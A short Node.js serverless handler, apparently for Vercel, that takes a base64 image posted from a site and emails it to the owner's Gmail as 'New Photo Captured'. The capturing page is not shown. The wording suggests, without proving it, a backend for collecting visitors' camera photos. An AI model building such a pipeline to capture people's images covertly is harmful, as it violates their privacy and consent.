import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(405).json({ error: 'Method not allowed' });
    return;
  }

  const { image } = req.body;

  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,   // هتخليهم في متغيرات البيئة على Vercel
      pass: process.env.GMAIL_PASS
    }
  });

  let mailOptions = {
    from: process.env.GMAIL_USER,
    to: process.env.GMAIL_USER,
    subject: 'New Photo Captured',
    html: '<p>Attached image from site.</p>',
    attachments: [{
      filename: 'photo.png',
      content: image.split("base64,")[1],
      encoding: 'base64'
    }]
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ message: 'Email sent' });
  } catch (error) {
    console.error('Email error:', error);
    res.status(500).json({ error: 'Failed to send email' });
  }
}
